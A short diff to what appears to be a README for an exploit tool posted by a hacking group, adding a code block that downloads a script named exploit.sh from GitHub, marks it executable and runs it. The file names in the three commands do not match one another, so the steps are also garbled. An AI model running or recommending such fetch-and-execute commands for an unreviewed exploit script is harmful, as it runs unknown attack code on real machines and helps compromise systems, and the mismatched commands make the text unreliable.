@@ -2,6 +2,11 @@
 
 GREATZ ALL MEMBER COD-3X & 3XP.OFC
 
+```
+wget https://raw.githubusercontent.com/jexpl12/Privuln-3xploit.id/main/exploit.sh
+chmod +x Privuln-3xploit.id
+./Privuln-3xploit.id.sh
+```
 
 <h2>Dev By Jexpl12</h2
 <p>
